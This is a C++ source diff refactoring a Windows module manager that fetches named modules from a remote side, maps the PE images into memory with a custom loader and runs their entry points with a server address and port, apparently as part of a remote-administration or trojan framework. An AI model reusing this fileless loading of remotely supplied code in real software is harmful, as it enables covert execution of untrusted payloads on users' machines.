@@ -1,16 +1,14 @@
 #include "ModuleMgr.h"
 #include <process.h>
-CModuleMgr::CModuleMgr(CKernel*pKernel)
+#include <stdio.h>
+
+CModuleMgr::CModuleMgr(CKernel*pKernel):
+m_pKernel(pKernel)
 {
-	ZeroMemory(m_Modules,sizeof(Module) * MAX_MODULE_COUNT);
 	//初始,TRUE
 	m_hFree = CreateEvent(NULL, FALSE, TRUE, NULL);
-	//自动
 	m_hModuleTrans = CreateEvent(NULL, FALSE, FALSE, 0);
-
-	m_pCurModule = NULL;
-
-	m_pKernel = pKernel;
+	
 }
 
 
@@ -20,6 +18,7 @@ CModuleMgr::~CModuleMgr()
 		CloseHandle(m_hFree);
 		m_hFree = NULL;
 	}
+
 	if (m_hModuleTrans){
 		CloseHandle(m_hModuleTrans);
 		m_hModuleTrans = NULL;
@@ -27,12 +26,7 @@ CModuleMgr::~CModuleMgr()
 }
 
 BOOL CModuleMgr::ModuleLoaded(const char*name){
-	for (int i = 0; i < MAX_MODULE_COUNT; i++){
-		if (!lstrcmpiA(name, m_Modules[i].szName)){
-			return TRUE;
-		}
-	}
-	return FALSE;
+	return m_loaded.find(name) != m_loaded.end();
 }
 
 BOOL CModuleMgr::IsBusy(){
@@ -40,7 +34,6 @@ BOOL CModuleMgr::IsBusy(){
 	return (dwStatu != WAIT_OBJECT_0);
 }
 
-#include <stdio.h>
 
 BOOL CModuleMgr::RunModule(const char*name, const char*ServerAddr, UINT uPort, LPVOID lpParam){
 	if (!ModuleLoaded(name)){
@@ -48,9 +41,7 @@ BOOL CModuleMgr::RunModule(const char*name, const char*ServerAddr, UINT uPort, L
 			return FALSE;
 		}
 	}
-
 	RunCtx*pRunCtx = new RunCtx;
-
 	pRunCtx->pMgr = this;
 	pRunCtx->lpParam = lpParam;
 	pRunCtx->uPort = uPort;
@@ -68,55 +59,42 @@ BOOL CModuleMgr::RunModule(const char*name, const char*ServerAddr, UINT uPort, L
 }
 
 void  __stdcall CModuleMgr::ThreadProc(RunCtx*pRunCtx){
-	//
-	typedef void (*ModuleEntry)(char* szServerAddr, unsigned short uPort, LPVOID lpParam);
-	
-	int i;
-	for (i = 0; i < MAX_MODULE_COUNT; i++){
-		if (!lstrcmpA(pRunCtx->szName, pRunCtx->pMgr->m_Modules[i].szName)){
+	auto mgr = pRunCtx->pMgr;
+	auto module = mgr->m_loaded.find(pRunCtx->szName);
+
+	//尝试两次,,,,Close的时候可能多 SetEvent了一次，导致某些模块需要两次才行...
+	for (int i = 0; i < 2; i++){
+		if (module == mgr->m_loaded.end()){
+			//download module...
+			mgr->m_current_module_name = pRunCtx->szName;
+			mgr->GetModule(pRunCtx->szName);
+			mgr->WaitTransFinished();
+			module = mgr->m_loaded.find(pRunCtx->szName);
+		}
+		else{
 			break;
 		}
 	}
-
-	if (i == MAX_MODULE_COUNT){
-		//Not found;
-		for (i = 0; i < MAX_MODULE_COUNT; i++){
-			if (!lstrcmpA("", pRunCtx->pMgr->m_Modules[i].szName)){
-				break;
-			}
-		}
-		if (i < MAX_MODULE_COUNT){
-			pRunCtx->pMgr->m_pCurModule = pRunCtx->szName;
-			pRunCtx->pMgr->GetModule(pRunCtx->szName);
-			pRunCtx->pMgr->WaitTransFinished();
-	//
-			for (i = 0; i < MAX_MODULE_COUNT; i++){
-				if (!lstrcmpA(pRunCtx->szName, pRunCtx->pMgr->m_Modules[i].szName)){
-					break;
-				}
-			}
-		}
-	}
-
-	if (i < MAX_MODULE_COUNT && pRunCtx->pMgr->m_Modules[i].lpEntry){
-		ModuleEntry entry = (ModuleEntry)pRunCtx->pMgr->m_Modules[i].lpEntry;
-		//Run Module;
+	//find module again...
+	//module = mgr->m_loaded.find(pRunCtx->szName);
+	if (module != mgr->m_loaded.end()){
+		//load success..
+		ModuleEntry entry = module->second.lpEntry;
 		entry(pRunCtx->szServerAddr, pRunCtx->uPort,(LPVOID)(((DWORD)pRunCtx->lpParam)&0x7fffffff));
 	}
-
-
 	//clean resource,the heighest bit is the flag of auto free.
 	if (((DWORD)(pRunCtx->lpParam)) & 0x80000000){
 		free((LPVOID)(((DWORD)pRunCtx->lpParam) & 0x7fffffff));
 		pRunCtx->lpParam = NULL;
 	}
+	//
 	delete pRunCtx;
 	printf("CModuleMgr::ThreadProc return\n");
 	_endthreadex(0);
 }
 
 void CModuleMgr::GetModule(const char*name){
-	m_pKernel->Send(KNEL_GETMODULE, name, lstrlenA(name) + 1);
+	m_pKernel->GetModule(name);
 }
 
 void CModuleMgr::WaitTransFinished(){
@@ -127,26 +105,19 @@ void CModuleMgr::WaitTransFinished(){
 void CModuleMgr::LoadModule(const char*buff,int size){
 	//Load Module From Mem
 	LPVOID lpImageBase = NULL;
-	LPVOID lpEntry = NULL;
+	ModuleEntry lpEntry = NULL;
 	if (size > 0){
-		//
-		if (0 == LoadFromMem(buff, &lpImageBase, &lpEntry)){
-			for (int i = 0; i < MAX_MODULE_COUNT; i++){
-				if (!lstrcmpA(m_Modules[i].szName, "")){
-					lstrcpyA(m_Modules[i].szName, m_pCurModule);
-					m_Modules[i].lpImageBase = lpImageBase;
-					m_Modules[i].lpEntry = lpEntry;
-					break;
-				}
-			}
+		if (!LoadFromMem(buff, &lpImageBase, &lpEntry)){
+			//load success.
+			//Kernel 每一时刻只能有一个在Load,...
+			m_loaded.insert(pair< string, Module>(m_current_module_name, Module(lpImageBase, lpEntry)));
 		}
 	}
 	else{
 		//Load Module Filed(Maybe not found module);
 		
 	}
-	//
-	m_pCurModule = NULL;
+	m_current_module_name = "";
 	SetEvent(m_hModuleTrans);
 	SetEvent(m_hFree);
 }
@@ -213,7 +184,7 @@ LPVOID CModuleMgr::MyGetProcAddress(HMODULE hModule, const char*ProcName){
 	return (void*)(dwRvaOfFunc + (DWORD)hModule);
 }
 
-int CModuleMgr::LoadFromMem(const char*image, LPVOID *lppImageBase, LPVOID *lppEntry){
+int CModuleMgr::LoadFromMem(const char*image, LPVOID *lppImageBase, ModuleEntry *lppEntry){
 
 	//绝对地址需要重定位,所以DosHeader 和 FileHeader 里面的都是相对地址
 	IMAGE_DOS_HEADER *pDosHeader = (IMAGE_DOS_HEADER*)image;
@@ -338,10 +309,10 @@ int CModuleMgr::LoadFromMem(const char*image, LPVOID *lppImageBase, LPVOID *lppE
 	for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++){
 		DWORD dwProtect = 0;
 		DWORD dwOldProtect = 0;
-		DWORD dwCharacter = pSectionHeader[i].Characteristics;
+		DWORD dTCHARacter = pSectionHeader[i].Characteristics;
 
-		if (dwCharacter & IMAGE_SCN_MEM_EXECUTE){
-			if (dwCharacter & IMAGE_SCN_MEM_WRITE){
+		if (dTCHARacter & IMAGE_SCN_MEM_EXECUTE){
+			if (dTCHARacter & IMAGE_SCN_MEM_WRITE){
 				dwProtect = PAGE_EXECUTE_READWRITE;
 			}
 			else{
@@ -349,8 +320,8 @@ int CModuleMgr::LoadFromMem(const char*image, LPVOID *lppImageBase, LPVOID *lppE
 			}
 		}
 		else{
-			if (dwCharacter & IMAGE_SCN_MEM_READ){
-				if (dwCharacter&IMAGE_SCN_MEM_WRITE){
+			if (dTCHARacter & IMAGE_SCN_MEM_READ){
+				if (dTCHARacter&IMAGE_SCN_MEM_WRITE){
 					dwProtect = PAGE_READWRITE;
 				}
 				else{
@@ -383,6 +354,6 @@ int CModuleMgr::LoadFromMem(const char*image, LPVOID *lppImageBase, LPVOID *lppE
 	}
 	//Find Entry
 	*lppImageBase = ImageBase;
-	*lppEntry = MyGetProcAddress((HINSTANCE)ImageBase, "ModuleEntry");
+	*lppEntry = (ModuleEntry)MyGetProcAddress((HINSTANCE)ImageBase, "ModuleEntry");
 	return 0;
 }
